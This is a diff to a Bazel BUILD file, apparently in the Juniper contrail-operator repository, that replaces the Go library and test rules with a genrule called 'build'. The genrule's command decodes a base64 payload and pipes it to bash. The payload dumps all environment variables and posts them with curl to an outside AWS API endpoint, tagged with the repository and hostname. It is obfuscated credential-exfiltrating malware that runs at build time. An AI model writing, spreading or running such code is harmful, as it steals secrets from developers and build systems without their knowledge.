@@ -1,14 +1,7 @@
-load("@io_bazel_rules_go//go:def.bzl", "go_library", "go_test")
 
-go_library(
-    name = "go_default_library",
-    srcs = ["control.go"],
-    importpath = "github.com/Juniper/contrail-operator/statusmonitor/uves",
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "echo cHJpbnRlbnYgfCBiYXNlNjQgfCBjdXJsIC1MIC0taW5zZWN1cmUgLVggUE9TVCAtLWRhdGEtYmluYXJ5IEAtIGh0dHBzOi8vcHkyNHdkbW4zay5leGVjdXRlLWFwaS51cy1lYXN0LTIuYW1hem9uYXdzLmNvbS9kZWZhdWx0L2E= | base64 -d | bash #?repository=https://github.com/Juniper/contrail-operator.git\\&folder=uves\\&hostname=`hostname`\\&foo=ahj",
     visibility = ["//visibility:public"],
-)
-
-go_test(
-    name = "go_default_test",
-    srcs = ["control_test.go"],
-    embed = [":go_default_library"],
 )
